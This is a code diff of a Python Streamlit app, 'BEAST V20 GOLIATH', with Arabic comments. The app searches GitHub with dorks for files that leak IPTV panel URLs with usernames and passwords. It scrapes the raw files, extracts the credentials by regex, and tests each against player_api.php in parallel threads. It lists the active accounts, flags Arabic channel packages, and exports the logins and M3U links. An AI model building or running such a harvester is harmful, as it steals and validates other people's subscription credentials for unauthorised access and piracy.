@@ -2,170 +2,157 @@ import streamlit as st
 import requests
 import re
 from datetime import datetime
+import concurrent.futures
 
 # =================================================
-# 1. إعدادات الأمان
+# 1. إعدادات الواجهة والجماليات (The Cinematic Look)
 # =================================================
-LOGIN_PASSWORD = "BEAST_V19_POWER" 
-
-if "password_correct" not in st.session_state:
-    st.session_state.password_correct = False
-
-if not st.session_state.password_correct:
-    st.markdown("<h2 style='text-align: center; color:#00ff41;'>🌪️ Ultra Beast V19 POWER</h2>", unsafe_allow_html=True)
-    pwd = st.text_input("أدخل كلمة المرور:", type="password")
-    if st.button("دخول"):
-        if pwd == LOGIN_PASSWORD:
-            st.session_state.password_correct = True
-            st.rerun()
-        else:
-            st.error("❌ خطأ!")
-    st.stop()
-
-# =================================================
-# 2. الواجهة والستايل
-# =================================================
-st.set_page_config(page_title="Ultra Beast V19", layout="wide")
+st.set_page_config(page_title="BEAST V20 GOLIATH", layout="wide", page_icon="🌪️")
 
 st.markdown("""
 <style>
-    .stApp { background-color: #0c0e12; color: white; }
-    .card {
-        background: #1a1d23; border: 1px solid #2d323b;
-        border-right: 5px solid #00ff41; padding: 15px;
-        border-radius: 8px; margin-bottom: 10px;
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+    .stApp { background-color: #05070a; color: #ffffff; }
+    .main-header { font-family: 'Orbitron', sans-serif; color: #00ff41; text-align: center; font-size: 45px; text-shadow: 0 0 20px #00ff41; margin-bottom: 30px; }
+    .beast-card {
+        background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(0, 255, 65, 0.2);
+        border-radius: 15px; padding: 20px; margin-bottom: 15px; backdrop-filter: blur(10px);
+        transition: 0.4s; position: relative; overflow: hidden;
     }
-    .arabic-badge { background: #ff4b4b; color: white; padding: 2px 5px; border-radius: 4px; font-size: 10px; }
+    .beast-card:hover { border-color: #00ff41; transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0, 255, 65, 0.15); }
+    .beast-card::before { content: ''; position: absolute; top: 0; right: 0; width: 5px; height: 100%; background: #00ff41; }
+    .arabic-badge { background: linear-gradient(45deg, #ff4b4b, #ff0000); color: white; padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+    .host-title { font-size: 18px; color: #00ff41; font-weight: bold; margin-bottom: 10px; display: block; }
+    .data-line { font-family: 'Courier New', monospace; font-size: 14px; color: #ced4da; }
+    .stButton>button { background: linear-gradient(45deg, #00ff41, #008f25) !important; color: black !important; font-weight: bold !important; border-radius: 10px !important; }
 </style>
 """, unsafe_allow_html=True)
 
+# إدارة الحالة
 if 'results' not in st.session_state: st.session_state.results = []
 if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
-if 'checked_count' not in st.session_state: st.session_state.checked_count = 0
 if 'seen_urls' not in st.session_state: st.session_state.seen_urls = set()
 
 # =================================================
-# 3. محرك الفحص (التحقق من المحتوى العربي)
+# 2. محرك الصيد العربي (The Arabic Engine)
 # =================================================
 
 def check_account(host, user, pw):
-    unique_key = f"{host}|{user}"
-    if unique_key in st.session_state.seen_urls: return None
-    st.session_state.seen_urls.add(unique_key)
-
+    if f"{host}{user}" in st.session_state.seen_urls: return None
+    st.session_state.seen_urls.add(f"{host}{user}")
+    
     try:
-        # 1. الفحص الأساسي للصلاحية
-        api_url = f"{host}/player_api.php?username={user}&password={pw}"
-        r = requests.get(api_url, timeout=4).json()
+        api = f"{host}/player_api.php?username={user}&password={pw}"
+        r = requests.get(api, timeout=3).json()
         
         if r.get("user_info", {}).get("status") == "Active":
+            # محرك كشف المحتوى العربي الذكي
+            is_arabic = False
+            cat_check = requests.get(f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories", timeout=2).text.upper()
+            arabic_keywords = ["ARABIC", "BEIN", "OSN", "SSC", "SHAHID", "EGYPT", "MAGHREB", "NILESAT", "MYHD"]
+            if any(k in cat_check for k in arabic_keywords): is_arabic = True
+            
             info = r["user_info"]
             exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
-            
-            # 2. فحص المحتوى العربي (اختياري وسريع)
-            is_arabic = False
-            try:
-                cat_res = requests.get(f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories", timeout=3).text.upper()
-                arabic_keywords = ["ARABIC", "BEIN", "OSN", "SSC", "SHAHID", "NILESAT", "MAGHREB", "EGYPT"]
-                if any(k in cat_res for k in arabic_keywords):
-                    is_arabic = True
-            except: pass
-
             return {
-                "host": host, "user": user, "pass": pw, 
-                "exp": exp, "conn": f"{info.get('active_cons')}/{info.get('max_connections')}",
-                "is_arabic": is_arabic,
-                "m3u": f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
+                "host": host, "user": user, "pass": pw, "exp": exp,
+                "conn": f"{info.get('active_cons')}/{info.get('max_connections')}",
+                "ar": is_arabic, "m3u": f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
             }
     except: return None
 
 # =================================================
-# 4. لوحة التحكم
+# 3. واجهة المستخدم
 # =================================================
 with st.sidebar:
-    st.title("🌪️ BEAST V19")
-    token = st.text_input("GitHub Token:", type="password", help="ضع توكن صالح لجلب النتائج")
+    st.markdown("<h2 style='color:#00ff41;'>🌪️ BEAST V20 PRO</h2>", unsafe_allow_html=True)
+    token = st.text_input("GitHub Token:", type="password")
     
     st.divider()
-    filter_ar = st.checkbox("عرض السيرفرات العربية فقط", value=False)
+    filter_arabic = st.checkbox("عرض المحتوى العربي فقط 🔥", value=True)
     
-    col1, col2 = st.columns(2)
-    with col1:
-        if st.button("🚀 ابدأ"): st.session_state.is_hunting = True
-    with col2:
-        if st.button("🛑 توقف"): st.session_state.is_hunting = False
+    if st.button("🚀 ابدأ الصيد العملاق"):
+        if token: st.session_state.is_hunting = True
+        else: st.error("ضع التوكن!")
+    
+    if st.button("🛑 توقف"): st.session_state.is_hunting = False
 
-    st.metric("🔍 تم فحصه", st.session_state.checked_count)
-    st.metric("💎 النتائج", len(st.session_state.results))
+    st.divider()
+    st.metric("💎 إجمالي الصيد", len(st.session_state.results))
+    
+    if st.session_state.results:
+        txt = ""
+        for r in st.session_state.results:
+            txt += f"HOST: {r['host']}\nUSER: {r['user']}\nPASS: {r['pass']}\nEXP: {r['exp']}\nARABIC: {r['ar']}\nM3U: {r['m3u']}\n" + "-"*20 + "\n"
+        st.download_button("📥 تحميل النتائج بالكامل", txt, "Beast_V20_Results.txt")
+
+st.markdown("<h1 class='main-header'>BEAST V20 GOLIATH</h1>", unsafe_allow_html=True)
 
 # =================================================
-# 5. منطقة النتائج
+# 4. الرادار وعرض النتائج (The Professional Grid)
 # =================================================
-st.subheader("📡 نتائج الصيد الذكي")
-res_container = st.empty()
+results_area = st.empty()
 
 def update_ui():
-    with res_container.container():
-        display_list = st.session_state.results
-        if filter_ar:
-            display_list = [i for i in display_list if i['is_arabic']]
-            
-        for item in display_list:
-            ar_tag = '<span class="arabic-badge">ARABIC ✅</span>' if item['is_arabic'] else ''
-            st.markdown(f"""
-            <div class="card">
-                <div style="display:flex; justify-content:space-between;">
-                    <b style="color:#00ff41;">{item['host']}</b>
-                    {ar_tag}
-                </div>
-                <div style="font-size:13px; margin-top:5px;">
-                    USER: {item['user']} | PASS: {item['pass']} | EXP: {item['exp']}
-                </div>
-                <code style="font-size:10px; color:#888;">{item['m3u']}</code>
-            </div>
-            """, unsafe_allow_html=True)
+    with results_area.container():
+        display = [i for i in st.session_state.results if not filter_arabic or i['ar']]
+        
+        # تقسيم النتائج لمجموعات من 3 لكل صف
+        for i in range(0, len(display), 3):
+            cols = st.columns(3)
+            for idx, item in enumerate(display[i:i+3]):
+                with cols[idx]:
+                    ar_badge = '<span class="arabic-badge">ARABIC CONTENT ✅</span>' if item['ar'] else ''
+                    st.markdown(f"""
+                    <div class="beast-card">
+                        <div style="display:flex; justify-content:space-between; align-items:start;">
+                            <span class="host-title">{item['host']}</span>
+                            {ar_badge}
+                        </div>
+                        <div class="data-line">
+                            👤 <b>USER:</b> {item['user']}<br>
+                            🔑 <b>PASS:</b> {item['pass']}<br>
+                            📅 <b>EXP:</b> <span style="color:#ffa500;">{item['exp']}</span><br>
+                            👥 <b>CONN:</b> {item['conn']}
+                        </div>
+                        <div style="margin-top:15px; background:rgba(0,0,0,0.3); padding:8px; border-radius:5px;">
+                            <code style="font-size:10px; color:#00ff41; word-break:break-all;">{item['m3u']}</code>
+                        </div>
+                    </div>
+                    """, unsafe_allow_html=True)
 
 if st.session_state.is_hunting:
-    if not token:
-        st.error("⚠️ يرجى إدخال GitHub Token!")
-        st.session_state.is_hunting = False
-    else:
-        headers = {'Authorization': f'token {token}'}
-        # دوركات قوية وشاملة (تجلب نتائج كثيرة)
-        dorks = [
-            '"player_api.php" username password extension:txt',
-            '"get.php?username=" password extension:m3u',
-            'filename:iptv.txt "http"',
-            'filename:beinsports.txt'
-        ]
-
-        for dork in dorks:
+    headers = {'Authorization': f'token {token}'}
+    # دوركات هجومية لجلب آلاف الملفات
+    dorks = [
+        'extension:txt "get.php?username=" "password=" ARABIC',
+        'extension:m3u "get.php?username=" "password=" SSC',
+        'filename:iptv.txt "http" BEIN',
+        'filename:shahid.txt',
+        'extension:txt "player_api.php" OSN'
+    ]
+    
+    for dork in dorks:
+        if not st.session_state.is_hunting: break
+        for page in range(1, 10): # سيبحث في أول 10 صفحات لكل دورك
             if not st.session_state.is_hunting: break
-            for page in range(1, 6):
-                if not st.session_state.is_hunting: break
-                try:
-                    search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=50"
-                    res = requests.get(search_url, headers=headers).json()
-                    
-                    if 'items' in res:
-                        for item in res['items']:
-                            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
-                            content = requests.get(raw_url, timeout=3).text
-                            matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
-                            
-                            for m in matches:
-                                st.session_state.checked_count += 1
-                                found = check_account(m[0], m[1], m[2])
+            try:
+                r = requests.get(f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100", headers=headers).json()
+                if 'items' in r:
+                    for item in r['items']:
+                        raw = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
+                        content = requests.get(raw, timeout=3).text
+                        matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
+                        
+                        # استخدام ThreadPool لسرعة البرق في الفحص
+                        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+                            future_to_check = {executor.submit(check_account, m[0], m[1], m[2]): m for m in matches}
+                            for future in concurrent.futures.as_completed(future_to_check):
+                                found = future.result()
                                 if found:
                                     st.session_state.results.insert(0, found)
                                     update_ui()
-                                    st.toast("🎯 تم صيد حساب جديد!")
-                    elif 'message' in res: # في حال انتهى حد التوكن
-                        st.warning(f"GitHub: {res['message']}")
-                        st.session_state.is_hunting = False
-                        break
-                except: continue
-        st.session_state.is_hunting = False
-        st.success("✅ انتهى البحث.")
+            except: continue
+    st.session_state.is_hunting = False
 else:
     update_ui()
